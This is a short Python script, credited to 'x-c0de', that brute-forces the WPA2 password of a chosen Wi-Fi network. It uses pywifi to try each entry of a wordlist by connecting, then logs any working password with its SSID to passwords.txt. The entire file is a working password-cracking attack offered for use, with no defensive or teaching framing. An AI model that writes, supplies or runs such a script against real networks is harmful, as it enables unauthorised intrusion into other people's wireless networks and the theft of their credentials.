# by x-c0de
# instagram x.c0de

import os
import os.path
import time,sys

try:
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
except:
    print("\033[1;34mInstalling pywifi\n\n")
    time.sleep(0.5)
    os.system("pip install pywifi")
    print("run script agan")
    sys.exit()


RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"

try:
    # wlan
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    ifaces.scan() #check the card
    results = ifaces.scan_results()


    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error system")



def get_location():
    print(__file__)
    l = len(__file__)
    f = __file__.split("\\")
    l = len(f)
    output =""
    for i in range(l):
        if i != l-1:
            output += f[i] +"\\"
    return output



def main(ssid, password, number):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.2) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # 1s

    if ifaces.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(BOLD, GREEN,'[*] Crack success!',RESET)
        print(BOLD, GREEN,'[*] password is ' + password, RESET)
        p=open("passwords.txt","a+")
        p.writelines(ssid+" : "+password + "\n")
        time.sleep(1)
        exit()
    else:
        print(RED, '[{}] Crack Failed using {}'.format(number, password))

def pwd(ssid, file):
    number = 0
    with open(file, 'r') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)
                    


def menu():


    print(BLUE)
    ssid = input("[*] SSID: ")

    filee = get_location()+input("[*] password list : ")


    if os.path.exists(filee):
        print(BLUE,"[~] Cracking...")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)


if __name__ == "__main__":
    menu()
